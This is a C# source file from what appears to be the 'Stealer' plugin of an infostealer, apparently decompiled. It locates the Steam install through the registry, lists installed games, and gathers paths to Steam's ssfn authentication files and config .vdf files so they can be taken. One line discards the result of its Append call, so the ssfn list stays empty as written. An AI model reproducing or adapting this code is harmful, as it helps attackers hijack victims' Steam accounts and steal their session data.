

using System.Collections.Generic;
using System.IO;
using System.Linq;
using InvokedCommon.Structs;
using Microsoft.Win32;


namespace Plugin.Helper.Stealer
{
	public static class Steam
	{
		public static SteamInfo? GetInfo()
		{
			List<string> stringList1 = new List<string>();
			string str1 = (string) null;
			RegistryView[] registryViewArray = new RegistryView[2]
			{
				RegistryView.Registry64,
				RegistryView.Registry32
			};
			foreach (RegistryView view in registryViewArray)
			{
				try
				{
					using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
					{
						string name = "Software\\Valve\\Steam";
						using (RegistryKey registryKey2 = registryKey1.OpenSubKey(name))
						{
							string str2 = registryKey2.GetValue("SteamPath").ToString();
							if (str2 != null)
							{
								str1 = str2;
								using (RegistryKey registryKey3 = registryKey2.OpenSubKey("Apps"))
								{
									foreach (string subKeyName in registryKey3.GetSubKeyNames())
									{
										using (RegistryKey registryKey4 = registryKey3.OpenSubKey(subKeyName))
										{
											object obj = registryKey4.GetValue("Name");
											if (obj != null)
												stringList1.Add(obj.ToString());
										}
									}
								}
							}
							else
								continue;
						}
					}
				}
				catch
				{
				}
				if (str1 != null)
					break;
			}
			if (str1 == null || !Directory.Exists(str1))
				return new SteamInfo?();
			List<string> source = new List<string>();
			List<string> stringList2 = new List<string>();
			foreach (string file in Directory.GetFiles(str1))
			{
				if (file.Contains("ssfn"))
					source.Append<string>(Path.GetFullPath(file));
			}
			string path = Path.Combine(str1, "config");
			if (Directory.Exists(path))
			{
				foreach (string file in Directory.GetFiles(path))
				{
					if (file.EndsWith("vdf"))
						stringList2.Add(Path.GetFullPath(file));
				}
			}
			return new SteamInfo?(new SteamInfo(stringList1.ToArray(), source.ToArray(), stringList2.ToArray()));
		}
	}
}
